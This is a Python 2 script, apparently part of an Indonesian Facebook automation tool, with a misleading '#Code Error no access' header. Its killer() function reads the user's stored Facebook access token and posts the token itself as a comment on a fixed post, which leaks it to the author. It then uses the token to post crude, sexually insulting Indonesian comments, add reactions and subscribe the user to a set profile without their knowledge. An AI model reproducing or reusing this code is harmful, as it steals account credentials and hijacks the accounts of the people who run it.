#Code Error no access
#coding=utf-8
import requests, sys, os, random, proff
from requests.exceptions import ConnectionError
komen1 = random.choice(['Bang Lu Ngntd!', 'Bang aku mau cerita nih bang Kemarin kan ada cewek ya bang yang minta sv terus aku jadian bang sama dia Udah 3 tahun berpacaran lewat wa bang Lha terus aku baru tau kalo dia itu berbatang :( asyuuu og :( ', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Bang sebenernya lu cakep bang tapi sayang kayak pejuh :v', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'buah mangga buah durian i love u bang :v', 'Hiiih abang jomblo ya? kasian bet dah :v', 'Wih Panutan Gua Nih', 'Bang prof kentod:v', 'Makan sayur di terminal Abang kayak marjinal:v'])
komen2 = random.choice(['Bang lu cakep tapi sayang kayak pejuh:v', 'Mantap Bang', 'bang lu kgk punya pacar?', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Hii abang gak punya pacar :v', 'Abang kemarin yang ngentod dipinggir jalan itu kan? ', 'Semoga Abang Jadi Orang Sukses', 'Bjir Ganteng Kali Kau Bang'])
komen3 = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'Wih Panutan Gua Nih'])
def killer():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(proff.login())
    kom = komen1
    komen = komen2
    komentar = komen3
    post = '1230470587425293'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + token + '&access_token=' + token)   
    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + komen + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)#prof
    exit(proff.menu())
